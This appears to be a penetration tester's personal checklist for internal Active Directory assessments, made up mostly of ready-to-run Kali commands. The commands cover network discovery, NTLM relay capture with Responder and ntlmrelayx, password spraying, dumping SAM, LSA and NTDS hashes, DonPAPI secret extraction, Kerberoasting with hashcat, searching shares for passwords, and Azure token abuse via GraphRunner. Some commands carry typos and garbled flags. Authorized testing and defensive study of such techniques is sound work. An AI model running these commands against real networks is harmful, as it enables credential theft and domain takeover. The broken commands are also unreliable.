# Internal Pentesting - Kali

{% hint style="danger" %}
This is my general rough process. Each pentest is unique and does not follow a "guide". Some of these tools are loud and will get deteced. Make sure YOU understand each tools use, flags, and more when using. Some tools may cause unintendid harm if used incorrectly.
{% endhint %}

## General

* Put targets into file (targets.txt)
* Find online hosts with nmap
* Findout what targets have SMB Signing disabled with NXC
  * Run responder, NTLMRelayX, and PCredz to capture relays if there enough machine without SMB Signing
* If SMB Signing is enabled, enumerate users
  * Kerbrute
  * NMap
  * Responder
  * NetExec
* Password Spray
  * SMBSpray
  * NetExec
* Enunerate with NMap
  * Look at all web services and ports. Check for default credentials, vulns, or exploits
  * Check if FTP has anonymous login enabled and look at files
  * See if SSH takes password authentication for potential brute force
* Find SMB NULL Sessions with SMBHunt and NMap

### If relays/hashes have been captures

* Check relays with NXC (sam, lsa, shares)
* Look for valid hashes / re-used hashes
* Look at file shares with ManSpider
* Try to crack hashes
* Enumerate with bloodhound.py / LDAP Domain Dump
* Look at Bloodhound / LDAP Domain Dump files

### Valid users

* Look at file shares with ManSpider
* Enumerate with bloodhound.py / LDAP Domain Dump
* Look at Bloodhound / LDAP Domain Dump files
* Kerberoast users
* Check Azure permissions
* Dump SAM/LSA with NetExec

## Starting - Nmap Scans

* Online Hosts(ICMP):

```
sudo nmap -sn -iL targets.txt -oG - | grep Up | cut -d' ' -f2 > up-hosts.txt
```

* Scan online hosts for common ports (21,22,80,389,443,3389,8443,8080, and UDP ports)

```
sudo nmap --open -p 389 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 389.txt && sudo nmap --open -p 80 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 80.txt && sudo nmap --open -p 8080 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 8080.txt && sudo nmap --open -p 443 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 443.txt && sudo nmap --open -p 8443 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 8443.txt && sudo nmap --open -p 21 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 21.txt && sudo nmap --open -p 22 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 22.txt && sudo nmap --open -p 3389 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 3389.txt && sudo nmap --open -p 445 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 445.txt && sudo nmap -Pn -sU -iL up-hosts.txt -p 1-1024,5353,1900 -vvv | grep "/open" | awk '{ print $2 }' > UDP.txt
```

* Scan for shares that allow anonymous login

```
sudo nmap -p 445 --script smb-enum-shares.nse,smb-enum-users.nse -iL targets.txt
```

* Scan for SNMP Info (Default Community name)

```
sudo nmap -p 161 --script=snmp-info -iL up-hosts.txt
```

* Scan all ports and list services, saving output

```
nmap --open -p- -Pn -sV -oA targets_65k-tcp-sV -iL targets.txt
```

* Scan for SSH Authentication Methods

```
sudo nmap -p 22 --script ssh-auth-methods -iL 22.txt
```

* LDAP:

```
tmp=$(mktemp); sudo nmap --open -p 389 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 389.txt; else rm -f "$tmp"; fi
```

* HTTP:

```
tmp=$(mktemp); sudo nmap --open -p 80 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > 80.txt"$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 80.txt; else rm -f "$tmp"; fi
```

* Alt HTTP:

```
tmp=$(mktemp); sudo nmap --open -p 8080 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 8080.txt; else rm -f "$tmp"; fi
```

* HTTPS:

```
tmp=$(mktemp); sudo nmap --open -p 443 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 443.txt; else rm -f "$tmp"; fi
```

* Alt HTTPS:

```
tmp=$(mktemp); sudo nmap --open -p 8443 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 8443.txt; else rm -f "$tmp"; fi
```

* FTP:

```
tmp=$(mktemp); sudo nmap --open -p 21 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 21.txt; else rm -f "$tmp"; fi
```

* SMB

```
tmp=$(mktemp); sudo nmap --open -p 139 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 139.txt; else rm -f "$tmp"; fi
```

```
tmp=$(mktemp); sudo nmap --open -p 445 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 445.txt; else rm -f "$tmp"; fi
```

* Determine Which hosts don't have signing

```
sudo nmap --script=smb2-security-mode.nse -p 445 -iL up-hosts.txt relay.txt
```

* SSH:

```
tmp=$(mktemp); sudo nmap --open -p 22 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 22.txt; else rm -f "$tmp"; fi
```

```
sudo nmap -p 22 --script ssh-auth-methods -iL 22.txt
```

* RDP:

```
tmp=$(mktemp); sudo nmap --open -p 3389 -iL up-hosts.txt -oG - | grep "/open" | awk '{ print $2 }' > "$tmp"; if [ -s "$tmp" ]; then mv "$tmp" 3389.txt; else rm -f "$tmp"; fi
```

```
sudo nmap -p 3389 --script rdp-ntlm-info -iL 3389.txt > RDP-NTLM-Info.txt
```

* UDP:

```
tmp=$(mktemp); sudo nmap -Pn -sU -iL targets.txt -p 1-1024,5353,1900 -vvv -oA UDP
```

```
sudo nmap -Pn -sU -iL up-hosts.txt -p 1-1024,5353,1900 -vvv | grep "/open" | awk '{ print $2 }' > UDP.txt
```

## Capturing relays - SMB Signing Not Required

1. Disable SMB and HTTP in Responder.conf:

```bash
sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf

# OR edit manually with:
nano /etc/responder/Responder.conf
```

2. Change the proxychains config

```bash
sudo sed -i 's/9050/1080/g' /etc/proxychains4.conf

# OR edit manually with:
sudo nano /etc/proxychains4.conf
```

At the bottom of the config to: `socks4 127.0.0.1 1080`

3. Make targest.txt with all in-scope targets/subnets and find online hosts

```bash
sudo nmap -sn -iL targets.txt -oG - | grep Up | cut -d' ' -f2 > up-hosts.txt
```

4. Use CME/NetExec to generate a list of hosts that has SMB signing not required (--gen-relay-list)

```bash
sudo netexec smb up-hosts.txt --gen-relay-list relay.txt
```

5. Run Responder, NTLMRelayX. and PCredz (in different tabs/panes) to capture hashes

```bash
# Responder
sudo python3 /usr/share/responder/Responder.py -I eth0 -PDv --lm
# Note, if you see a lot of Wpad requests, switch it from -PDv to -Dwv

# NTLMRelayX
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf relay.txt -socks -smb2support -i -of relyed-hashes.txt

# PCredz
sudo apt install python3-pip libpcap-dev && sudo pip3 install Cython python-libpcap
sudo python3 ./Pcredz -i eth0 -v
```

## Enumeration

While capturing relays(If able to), enumerate with more NMap Scans. Get versioning on other services running.

### Enumerate Users

* [Kerbrute](https://github.com/ropnop/kerbrute/releases)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
./kerbrute_linux_amd64 userenum -d DOMAIN --dc DC-IP USERLIST.txt | grep "VALID USERNAME" | awk '{print $7}' > valid_users.txt
```

* Responder - Have `SMB` and `HTTP` turned on in the config before running this.

```
sudo python3 /usr/share/responder/Responder.py -I eth0
```

* NetExec

```
nxc smb targets.txt -u "" -p "" --pass-pol
```

```
nxc smb dc-IP --users
```

* NMap

```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN',userdb=users.txt" DC-IP
```

### Password Spray

* [SMBSpray](https://github.com/absolomb/smbspray)

```
git clone https://github.com/absolomb/smbspray.git && cd smbspray
python3 smbspray.py -u users.txt -p passwords.txt -ip DC-IP
```

* NetExec

```
nxc smb IP -u users.txt -p 'Password123!' --continue-on-success
nxc smb IP -u users.txt -p passwords. txt --continue-on-success
nxc smb IP -u userl user2 user3 -p Summer18
nxc smb IP -u userl -p passwordl password2 password3
nxc smb IP -u user.txt -p user.txt —no-bruteforce --continue-on-success
nxc smb IP -u user.txt -p password.txt —-no-bruteforce —-continue-on-success
nxc smb IP -u user.txt -p password.txt —-no-bruteforce —-continue-on-success -d DELAY-#-IN-MINUTES
```

### SMB Null Sessions

* SMBHunt

```
git clone https://github.com/Raikia/SMBCrunch.git && cd SMBCrunch
sudo ./smbhunt.pl -i ../445.txt
```

* NMap

```
sudo nmap -p 445 --script smb-enum-shares.nse,smb-enum-users.nse -iL targets.txt
```

View Null sessions with

```
sudo smbclient -L //target/share -U ""
```

Find password policy with

```
sudo nxc smb ip -u '' -p '' --pass-pol
```

### If HTTP/HTTPs services are running:

* [Ffuf](https://github.com/ffuf/ffuf)

```bash
sudo ffuf -recursion -mc all -ac -c -e https://[domain]/FUZZ -w [wordlist]
sudo ffuf -recursion -mc all -ac -c -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml -w [wordlist] -u https://[domain]/FUZZ -fc 400,401,403,404,406,500,502 > [domain].txt
```

* [Nikto](https://github.com/sullo/nikto)

```bash
sudo nikto -h [URL]
```

* View pages, look at `/robots.txt`, `/wp-admin.php`, `/wp-login.php`, and page-source

### NetExec

* Relay:

```bash
sudo proxychains4 netexec smb ip -u user -p 'password' --shares / --lsa / --sam
```

* Hash:

```bash
sudo proxychains4 netexec smb ip -u user -H 'HASH' --shares / --lsa / --sam
```

* Password

```bash
sudo netexec smb ip -u user -p 'password' --shares / --lsa / --sam
```

### Donpapi

* Relay

```bash
sudo proxychains python DonPAPI.py DOMAIN/USER@IP -o DonPAPI_Relay -no-pass
```

* Hash

```bash
sudo DonPAPI --hashes <LM>:<NT> DOMAIN/USER@IP -o DonPAPI_Relay
```

* Password

```bash
sudo DonPAPI DOMAIN/USER:PASSWORD@IP -o DonPAPI_Relay
```

## With valid creds:

### [Bloodhound.py](http://bloodhound.py/)

Bring the .json files into Bloodhound

```bash
sudo bloodhound-python -u USER -p PASSWORD -ns DNS Server -d DOMAIN -c All
```

### LDAPDomainDump

```bash
sudo ldapdomaindump -u DOMAIN\\USER -p PASSWORD IP
```

### Look at SMB shares

Can be used if it's world readable/doesn't require creds

```bash
smbclient //IP/SHARE -U DOMAIN/USERNAME
smbclient //IP/SHARE -U DOMAIN/USERNAME -P PASSWORD
```

### Scan Shares for Files

### [Manspider](https://github.com/blacklanternsecurity/MANSPIDER)

* Search hostname/IP for files with "passw" in the name:

```
manspider TARGET -f passw -d DOMAIN -u USER -p 'PASSWORD'
```

* Search for documents containing passwords

```
manspider TAGRGET -c passw -d DOMAIN -u USER -p 'PASSWORD'
```

### Target Kerberoastable Users from Bloodhound

```
sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast
```

Crack the hash with hashcat

```
hashcat -m 13100 hashes.kerberoast -r rule wordlist -o outputfile -O
```

### Check Permissions in Azure

* Log into https://portal.azure.com
* Run [GraphRunner](https://github.com/dafthack/GraphRunner/)

```
cd (GraphRunner directory)
Import-Module .\GraphRunner.ps1
Get-GraphTokens
Invoke-GraphRunner -Tokens $tokens
```

* Searc for passwords, and other files via sharepoint

```
Invoke-SearchSharePointAndOneDrive -tokens $tokens
```

## Netexec Commands

* Find ip/hostname/SMB Signinig/etc:

```bash
sudo netexec smb targets.txt
sudo netexec smb targets.txt --gen-relay-list relay.txt
```

* Enumerate SAM hashes

```bash
sudo netexec smb ip -u user -p 'password' --sam
sudo netexec smb ip -u user -p 'password' --sam --user target-user
```

* Enumerate LSA for potential plaintext passwords

```bash
sudo netexec smb ip -u user -p 'password' --lsa
```

* Enumerate shares

```bash
sudo netexec smb ip -u user -p 'password' --shares
```

* Pass cmd

```bash
sudo netexec smb ip -u user -p 'password' -x 'command'
```

* Pass powershell

```bash
sudo netexec smb ip -u user -p 'password' -X 'command'
```

* Look at domain admins

```bash
sudo netexec smb ip -u user -p 'password' -x 'net group "Domain Admins" /domain'
```

* Look at logged on users

```bash
sudo netexec smb ip -u user -p 'password' --loggedon-users
```

* Look at NTDS.dit Use with CAUTION. Is loud and may cause DC to crash.

```bash
sudo netexec smb dc-ip -u domain-admin-user -p 'password' --ntds
```

* Find out what machines a user can successfully log onto This is LOUD - use it with caution

```bash
sudo netexec smb targets.txt -u user -p 'password'
sudo netexec smb targets.txt -u user -H 'hash'
```
